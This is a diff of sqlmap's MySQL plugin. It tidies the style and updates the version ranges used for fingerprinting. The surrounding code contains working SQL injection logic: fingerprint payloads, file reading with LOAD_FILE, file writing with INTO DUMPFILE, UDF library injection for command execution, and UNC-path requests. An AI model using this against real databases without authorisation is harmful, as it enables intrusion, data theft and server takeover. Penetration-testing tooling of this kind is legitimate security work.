@@ -22,8 +22,6 @@ with sqlmap; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 
-
-
 import os
 import re
 
@@ -54,7 +52,6 @@ from plugins.generic.fingerprint import Fingerprint
 from plugins.generic.misc import Miscellaneous
 from plugins.generic.takeover import Takeover
 
-
 class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
     """
     This class defines MySQL methods
@@ -76,7 +73,6 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
         Takeover.__init__(self)
 
         unescaper.setUnescape(MySQLMap.unescape)
-
 
     @staticmethod
     def unescape(expression, quote=True):
@@ -111,7 +107,6 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
 
         return expression
 
-
     @staticmethod
     def escape(expression):
         while True:
@@ -135,8 +130,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
             expression = expression.replace(old, escaped)
 
         return expression
-
-
+        
     def __commentCheck(self):
         infoMsg = "executing MySQL comment injection fingerprint"
         logger.info(infoMsg)
@@ -146,20 +140,20 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
         payload = agent.payload(newValue=query)
         result  = Request.queryPage(payload)
 
-        if result != True:
+        if not result:
             warnMsg = "unable to perform MySQL comment injection"
             logger.warn(warnMsg)
 
             return None
 
-        # MySQL valid versions updated on 05/2009
+        # MySQL valid versions updated on 12/2009
         versions = (
                      (32200, 32233),    # MySQL 3.22
                      (32300, 32359),    # MySQL 3.23
                      (40000, 40031),    # MySQL 4.0
                      (40100, 40122),    # MySQL 4.1
-                     (50000, 50077),    # MySQL 5.0
-                     (50100, 50134),    # MySQL 5.1
+                     (50000, 50089),    # MySQL 5.0
+                     (50100, 50141),    # MySQL 5.1
                      (50400, 50401),    # MySQL 5.4
                      (60000, 60010),    # MySQL 6.0
                    )
@@ -175,7 +169,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
                 payload = agent.payload(newValue=query)
                 result  = Request.queryPage(payload)
 
-                if result == True:
+                if result:
                     if not prevVer:
                         prevVer = version
 
@@ -191,7 +185,6 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
                 prevVer = version
 
         return None
-
 
     def getFingerprint(self):
         value  = ""
@@ -237,7 +230,6 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
 
         return value
 
-
     def checkDbms(self):
         """
         References for fingerprint:
@@ -266,14 +258,14 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
         payload = agent.fullPayload(" AND CONNECTION_ID()=CONNECTION_ID()")
         result  = Request.queryPage(payload)
 
-        if result == True:
+        if result:
             infoMsg = "confirming MySQL"
             logger.info(infoMsg)
 
             payload = agent.fullPayload(" AND ISNULL(1/0)")
             result  = Request.queryPage(payload)
 
-            if result != True:
+            if not result:
                 warnMsg = "the back-end DMBS is not MySQL"
                 logger.warn(warnMsg)
 
@@ -352,8 +344,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
             logger.warn(warnMsg)
 
             return False
-
-
+        
     def checkDbmsOs(self, detailed=False):
         if kb.os:
             return
@@ -375,8 +366,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
         logger.info(infoMsg)
 
         self.cleanup(onlyFileTbl=True)
-
-
+        
     def unionReadFile(self, rFile):
         infoMsg = "fetching file: '%s'" % rFile
         logger.info(infoMsg)
@@ -384,8 +374,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
         result = inject.getValue("SELECT HEX(LOAD_FILE('%s'))" % rFile)
 
         return result
-
-
+    
     def stackedReadFile(self, rFile):
         infoMsg = "fetching file: '%s'" % rFile
         logger.info(infoMsg)
@@ -426,8 +415,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
             result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), sort=False, resumeValue=False, charsetType=3)
 
         return result
-
-
+        
     def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
         logger.debug("encoding file to its hexadecimal string value")
 
@@ -455,10 +443,9 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
 
         conf.paramFalseCond = oldParamFalseCond
 
-        if confirm == True:
+        if confirm:
             self.askCheckWrittenFile(wFile, dFile, fileType)
-
-
+            
     def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
         debugMsg  = "creating a support table to write the hexadecimal "
         debugMsg += "encoded file to"
@@ -486,10 +473,9 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
         # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
         inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, dFile), silent=True)
 
-        if confirm == True:
+        if confirm:
             self.askCheckWrittenFile(wFile, dFile, fileType)
-
-
+            
     def udfSetRemotePath(self):
         self.getVersionFromBanner()
 
@@ -539,10 +525,8 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
             # The SO can be in either /lib, /usr/lib or one of the
             # paths specified in /etc/ld.so.conf file, none of these
             # paths are writable by mysql user by default
-            # TODO: test with plugins folder on MySQL >= 5.1.19
             self.udfRemoteFile = "/usr/lib/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)
-
-
+            
     def udfCreateFromSharedLib(self, udf, inpRet):
         if udf in self.udfToCreate:
             logger.info("creating UDF '%s' from the binary UDF file" % udf)
@@ -556,8 +540,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
             self.createdUdf.add(udf)
         else:
             logger.debug("keeping existing UDF '%s' as requested" % udf)
-
-
+            
     def udfInjectCmd(self):
         self.udfLocalFile     = paths.SQLMAP_UDF_PATH
         self.udfSharedLibName = "libsqlmapudf%s" % randomStr(lowercase=True)
@@ -571,10 +554,9 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
 
         self.udfInjectCore(self.sysUdfs)
         self.envInitialized = True
-
-
+        
     def uncPathRequest(self):
-        if kb.stackedTest == False:
+        if not kb.stackedTest:
             query   = agent.prefixQuery(" AND LOAD_FILE('%s')" % self.uncPath)
             query   = agent.postfixQuery(query)
             payload = agent.payload(newValue=query)
